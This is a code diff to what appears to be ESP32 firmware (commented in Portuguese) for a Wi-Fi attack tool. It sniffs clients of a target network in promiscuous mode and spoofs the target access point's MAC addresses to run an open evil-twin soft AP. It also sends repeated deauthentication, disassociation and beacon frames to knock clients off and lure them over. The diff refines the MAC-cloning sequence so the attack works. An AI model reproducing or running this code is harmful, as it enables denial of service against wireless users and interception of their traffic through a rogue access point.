@@ -27,7 +27,7 @@ static unsigned long cloneStartTime = 0;
 static uint8_t cloneHealthCheckFailures = 0;
 
 // ============================================================
-// CLIENT DISCOVERY (promiscuous mode) - PARSING CORRETO
+// CLIENT DISCOVERY (promiscuous mode)
 // ============================================================
 #define MAX_CLIENTS 8
 static uint8_t discoveredClients[MAX_CLIENTS][6];
@@ -35,8 +35,8 @@ static uint8_t clientCount = 0;
 static bool promiscuousActive = false;
 
 static void getBssidFromFrame(const uint8_t *payload, uint8_t *outBssid, const uint8_t **outClient) {
-    uint8_t frameType = payload[0] & 0x0C;      // 0x00=MGMT, 0x04=CTRL, 0x08=DATA
-    uint8_t toFromDs = payload[1] & 0x03;       // bits 0-1: ToDS, FromDS
+    uint8_t frameType = payload[0] & 0x0C;
+    uint8_t toFromDs = payload[1] & 0x03;
     const uint8_t *addr1 = &payload[4];
     const uint8_t *addr2 = &payload[10];
     const uint8_t *addr3 = &payload[16];
@@ -45,30 +45,24 @@ static void getBssidFromFrame(const uint8_t *payload, uint8_t *outBssid, const u
     *outClient = nullptr;
     
     if (frameType == 0x00) {
-        // MANAGEMENT: addr1=DA, addr2=SA, addr3=BSSID
         memcpy(outBssid, addr3, 6);
-        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2; // SA e cliente
+        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
         else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
     }
     else if (frameType == 0x08) {
-        // DATA frame
         switch (toFromDs) {
-            case 0x00: // ToDS=0, FromDS=0 (IBSS): addr3=BSSID
+            case 0x00:
                 memcpy(outBssid, addr3, 6);
                 if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                 else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                 break;
-            case 0x01: // ToDS=0, FromDS=1 (AP->STA): addr2=BSSID, addr3=SA
+            case 0x01:
                 memcpy(outBssid, addr2, 6);
-                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1; // DA=cliente
+                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                 break;
-            case 0x02: // ToDS=1, FromDS=0 (STA->AP): addr1=BSSID, addr2=SA
+            case 0x02:
                 memcpy(outBssid, addr1, 6);
-                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2; // SA=cliente
-                break;
-            case 0x03: // ToDS=1, FromDS=1 (WDS): addr4=SA (nao usamos)
-                // addr2=TA (transmitter), addr3=DA
-                // BSSID nao e direto, ignora para evitar falsos positivos
+                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                 break;
         }
     }
@@ -85,12 +79,10 @@ static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     
     getBssidFromFrame(payload, frameBssid, &clientMac);
     
-    // So processa se o BSSID do frame for EXATAMENTE o alvo
     if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
     if (!clientMac) return;
-    if (clientMac[0] & 0x01) return; // ignora multicast/broadcast
+    if (clientMac[0] & 0x01) return;
     
-    // Verifica se ja nao esta na lista
     for (int i = 0; i < clientCount; i++) {
         if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
     }
@@ -278,7 +270,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// BSSID CLONE
+// BSSID CLONE - CORRECAO: sequencia correta para Arduino-ESP32
 // ============================================================
 static void startBssidClone(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -297,6 +289,7 @@ static void startBssidClone(uint8_t networkIndex) {
     strncpy(cloneSSID, target->ssid, 32);
     cloneSSID[32] = '\0';
 
+    // Salva MACs originais
     esp_wifi_get_mac(WIFI_IF_STA, originalSTAMac);
     esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
 
@@ -305,22 +298,33 @@ static void startBssidClone(uint8_t networkIndex) {
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
+    // === PASSO 1: Desliga WiFi completamente (Arduino way) ===
     WiFi.softAPdisconnect(true);
     WiFi.disconnect(true);
-    WiFi.mode(WIFI_MODE_NULL);
-    delay(800);
+    WiFi.mode(WIFI_OFF);
+    delay(1000); // Aguarda o driver desligar DE VERDADE
 
+    // === PASSO 2: Inicializa em modo STA (driver ligado, mas sem conexao) ===
+    WiFi.mode(WIFI_STA);
+    delay(200);
+    WiFi.disconnect(true); // Garante desconectado
+    delay(200);
+
+    // === PASSO 3: Spoofa MAC da STA (funciona quando desconectado) ===
     esp_err_t staMacErr = esp_wifi_set_mac(WIFI_IF_STA, target->bssid);
     Serial.printf("[Clone] Set STA MAC: %d (%s)\n", staMacErr, staMacErr == ESP_OK ? "OK" : "FAIL");
     delay(100);
 
+    // === PASSO 4: Muda para AP_STA ===
+    WiFi.mode(WIFI_AP_STA);
+    delay(300);
+
+    // === PASSO 5: Spoofa MAC da AP (funciona em AP_STA) ===
     esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
     Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
     delay(100);
 
-    WiFi.mode(WIFI_AP_STA);
-    delay(300);
-
+    // === PASSO 6: Inicia o softAP ===
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");
@@ -344,15 +348,22 @@ static void restartBssidClone() {
     Serial.println("[Clone] Restarting...");
     
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_MODE_NULL);
+    WiFi.mode(WIFI_OFF);
     delay(500);
     
+    WiFi.mode(WIFI_STA);
+    delay(200);
+    WiFi.disconnect(true);
+    delay(200);
+    
     esp_wifi_set_mac(WIFI_IF_STA, deauthTargetBSSID);
-    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     delay(100);
     
     WiFi.mode(WIFI_AP_STA);
     delay(200);
+    
+    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
+    delay(100);
     
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
@@ -374,13 +385,22 @@ static void stopBssidClone() {
     
     WiFi.softAPdisconnect(true);
     WiFi.disconnect(true);
-    WiFi.mode(WIFI_MODE_NULL);
+    WiFi.mode(WIFI_OFF);
     delay(500);
 
-    esp_wifi_set_mac(WIFI_IF_STA, originalSTAMac);
-    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
+    // Restaura MACs originais
+    WiFi.mode(WIFI_STA);
     delay(200);
-
+    WiFi.disconnect(true);
+    delay(200);
+    esp_wifi_set_mac(WIFI_IF_STA, originalSTAMac);
+    delay(100);
+    
+    WiFi.mode(WIFI_AP_STA);
+    delay(200);
+    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
+    delay(100);
+    
     WiFi.mode(WIFI_STA);
     delay(200);
 
@@ -431,21 +451,21 @@ bool deauthLoop() {
     if (millis() - lastBurst >= 2) {
         lastBurst = millis();
 
-        // === UNICAST para clientes descobertos do BSSID ALVO ===
+        // UNICAST para clientes descobertos do BSSID ALVO
         for (int i = 0; i < clientCount; i++) {
             sendDeauthFrame(deauthTargetBSSID, discoveredClients[i], 0x07);
             sendDisassocFrame(deauthTargetBSSID, discoveredClients[i], 0x08);
         }
 
-        // === BROADCAST so para o BSSID alvo (nao afeta outras redes) ===
+        // BROADCAST como fallback
         sendDeauthFrame(deauthTargetBSSID, nullptr, 0x07);
         sendDisassocFrame(deauthTargetBSSID, nullptr, 0x08);
         
-        // === BEACON ===
+        // BEACON para atrair
         sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
     }
 
-    // === HEALTH CHECK ===
+    // HEALTH CHECK
     static unsigned long lastHealthCheck = 0;
     if (millis() - lastHealthCheck > 3000) {
         lastHealthCheck = millis();
